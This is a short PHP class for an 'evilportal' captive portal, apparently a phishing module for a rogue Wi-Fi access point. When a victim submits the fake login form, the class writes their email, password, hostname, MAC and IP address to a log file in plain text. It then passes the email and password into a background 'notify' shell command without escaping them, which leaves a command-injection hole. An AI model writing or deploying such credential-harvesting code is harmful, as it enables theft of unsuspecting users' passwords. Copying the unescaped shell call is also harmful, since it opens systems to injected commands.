<?php namespace evilportal;

class MyPortal extends Portal
{
    public function handleAuthorization()
    {
        if (isset($_POST['email'])) {
            $email = $_POST['email'];
            $pwd = $_POST['password'];
            $hostname = $_POST['hostname'];
            $mac = $_POST['mac'];
            $ip = $_POST['ip'];

            $reflector = new \ReflectionClass(get_class($this));
            $logPath = dirname($reflector->getFileName());
            file_put_contents("{$logPath}/portal.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
            $this->execBackground("notify $email' - '$pwd");
        }
        parent::handleAuthorization();
    }

    public function onSuccess()
    {
        parent::onSuccess();
    }

    public function showError()
    {
        parent::showError();
    }
}
